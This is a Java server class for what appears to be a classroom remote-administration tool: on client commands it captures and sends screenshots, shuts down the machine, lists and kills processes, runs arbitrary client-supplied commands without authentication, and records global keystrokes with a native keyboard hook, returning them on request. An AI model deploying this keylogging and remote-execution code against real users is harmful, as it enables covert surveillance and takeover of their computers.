package serverPackage;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

import javax.imageio.ImageIO;
import javax.swing.JOptionPane;
import javax.swing.table.DefaultTableModel;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import serverPackage.Chat;

public class Server implements ActionListener, Runnable, NativeKeyListener
{
	public String line = ""; 
	public int capsLock = 0;
	public boolean hook_status = false;
	public boolean check = false;
	
	private ServerDesign serverDesign;
	private ServerSocket serverSocket;
	private Socket socket;
	private BufferedReader reader;
	private PrintWriter out;
	ActionEvent e;
	
	public Server(ServerDesign serverDesign) 
	{
		this.serverDesign = serverDesign;
	}
	
	public static String receiveSignal(BufferedReader reader) 
	{
		try 
		{
			String request = reader.readLine();
			return request;
		}
		catch (Exception ex) 
		{
			String request = "QUIT";
			return request;
		}
	}

	public void actionPerformed(ActionEvent e) 
	{
		if (e.getSource() == serverDesign.button1)
		{
			try {
				serverSocket = new ServerSocket(1234);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
			
			Thread t = new Thread(this);
			t.start();
			
			try {
				Socket IPsocket = new Socket();
				IPsocket.connect(new InetSocketAddress("google.com", 80));
				String serverIPAddress = IPsocket.getLocalAddress().toString();
				serverIPAddress = serverIPAddress.substring(1);
				JOptionPane.showMessageDialog(null, "IPv4: " + serverIPAddress);
				IPsocket.close();

			}
			catch (Exception ex) {
				System.out.println("Listening...");
			}
		}
	}
	
	
	public void run() 
	{			
		{
			while (true)
			{
				try 
				{
					socket = serverSocket.accept();
					
					if (socket != null) {	
						reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
						out = new PrintWriter(socket.getOutputStream());
						
						String request = "";
					    
						while(true) {
							request = receiveSignal(reader);
							
							switch(request) {
								case "TAKE": 
								{
									Toolkit toolkit = Toolkit.getDefaultToolkit();
									Dimension dimensions = toolkit.getScreenSize();
									
									OutputStream outputStream = socket.getOutputStream();
									
									Robot robot = new Robot();
									BufferedImage screenshot = robot.createScreenCapture(new Rectangle(dimensions));
									BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(outputStream);
									ImageIO.write(screenshot,"png",bufferedOutputStream);

									break;
								}
								
								case "SHUTDOWN":
								{
									String shutdownCommand;
								    String operatingSystem = System.getProperty("os.name");

								    if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) {
								        shutdownCommand = "shutdown -h now";
								    }
								    // This will work on any version of windows including version 11 
								    else if (operatingSystem.contains("Windows")) {
								        shutdownCommand = "shutdown.exe -s -t 0";
								    }
								    else {
								        throw new RuntimeException("Unsupported operating system.");
								    }

								    Runtime.getRuntime().exec(shutdownCommand);
								    System.exit(0);
								    break;
								}
								
								case "SHOW":
								{
									try {
										Process process = new ProcessBuilder("tasklist.exe", "/fo", "csv", "/nh").start();
										new Thread(() -> {
								            Scanner sc = new Scanner(process.getInputStream());
								            if (sc.hasNextLine()) sc.nextLine();
								            while (sc.hasNextLine()) {
								                String line = sc.nextLine();
								                out.println(line);
								                out.flush();
								            }
								            out.println("NULL");
							                out.flush();
								        }).start();
								        process.waitFor();
								        break;
									} catch (Exception ex) {
										ex.printStackTrace();
										break;
									}
								}
								
								case "APPXEM":
								{
									try {
										Process process = new ProcessBuilder("powershell","\"gps| ? {$_.mainwindowtitle.length -ne 0} | Format-Table -HideTableHeaders  name, ID, Handles").start();
								        new Thread(() -> {
								            Scanner sc = new Scanner(process.getInputStream());
								            if (sc.hasNextLine()) sc.nextLine();
								            while (sc.hasNextLine()) {
								                String line = sc.nextLine();
								                out.println(line);
								                out.flush();
								            }
								            out.println("NULL");
							                out.flush();
								        }).start();
								        process.waitFor();
								        break;
									} catch (Exception ex) {
										break;
									}
								}
								
								case "KILL":
								{
									try {
										String IDString = reader.readLine();
										int ID = Integer.parseInt(IDString);
																			
										if(isProcessIdRunning(ID) == true) {
											
											// kill
											String cmd = "taskkill /F /T /PID " + ID;
											Runtime.getRuntime().exec(cmd);
											String response = "KILLED";
											out.println(response);
											out.flush();
										} else {
											String response = "ERROR";
											out.println(response);
											out.flush();
										}
										break;
									} catch (Exception e) {
										break;
									}
								}
								
								case "START":
								{
									String Name = reader.readLine();
									
									Runtime runtime = Runtime.getRuntime();
									try {
										Process p = runtime.exec(Name);
										String response = "STARTED";
										out.println(response);
										out.flush();
									} catch (Exception e) {
										String response = "ERROR";
										out.println(response);
										out.flush(); 
									}
									break;
								}
								
								case "CHAT":
								{
									reader = null;
									out = null;
									Chat chat = new Chat(socket);
									chat.setVisible(true);
								}
								
								case "HOOK":
								{
									if (check == false) {
										check = true;
										try {
											GlobalScreen.registerNativeHook(); 
										}
										catch (NativeHookException ex) {
											System.err.println("There was a problem registering the native hook.");
											System.err.println(ex.getMessage());

											System.exit(1);
										}
										GlobalScreen.addNativeKeyListener(new abc());
									}
								
									hook_status = true; 
									break;
								}
								
								case "UNHOOK":
								{
									hook_status = false;
									break;
								}
								
								case "PRINT":
								{
//									System.out.println(line);
									out.println(line);
									out.flush();
									line = "";
									break;
								}
								
								case "QUIT":
								{
									break;
								}
							}
						}
					}
					Thread.sleep(1000);
				}
				catch (Exception e1) {
					JOptionPane.showMessageDialog(null, "Mất kết nối với Client", "Lỗi", JOptionPane.ERROR_MESSAGE);
				} 
			}
		}
					
				
		
	}
		
	public static boolean isProcessIdRunning(int pid) {
        try {
            Runtime runtime = Runtime.getRuntime();
            String cmds[] = {"cmd", "/c", "tasklist /FI \"PID eq " + pid + "\""};
            Process proc = runtime.exec(cmds);

            InputStream inputstream = proc.getInputStream();
            InputStreamReader inputstreamreader = new InputStreamReader(inputstream);
            BufferedReader bufferedreader = new BufferedReader(inputstreamreader);
            String line;
            while ((line = bufferedreader.readLine()) != null) {
                if (line.contains(" " + pid + " ")){
                    return true;
                }
            }
            
            return false;
        } catch (Exception ex) {
            ex.printStackTrace();
            System.exit(0);
        }

        return false;
    }
	
	public class abc implements NativeKeyListener {
		public void nativeKeyPressed(NativeKeyEvent e) {
			if (hook_status) {
			String a = (String) NativeKeyEvent.getKeyText(e.getKeyCode()); 
			
			switch (a) {
				case "Space":
					line += " ";
					break;
				case "Enter":
					line += a;
//					line +="\n";
					break;
				case "Caps Lock":
					if (capsLock == 0) capsLock = 1;
					else capsLock = 0;
					break;
				default:
					if (capsLock == 0) line += a.toLowerCase();
					else line += a.toUpperCase();
			}
			}
		}
	}
}
